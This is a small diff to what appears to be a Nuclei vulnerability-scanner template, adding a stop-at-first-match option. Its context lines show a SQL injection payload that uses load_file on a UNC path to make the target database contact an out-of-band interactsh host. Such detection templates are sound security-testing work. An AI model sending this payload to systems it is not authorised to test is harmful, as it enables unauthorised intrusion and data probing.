@@ -11,6 +11,7 @@ http:
     path:
       - "{{BaseURL}}/?id=1;SELECT+load_file('\\\\{{interactsh-url}}\\\\x')"
 
+    stop-at-first-match: true
     matchers:
       - type: word
         part: interactsh_protocol
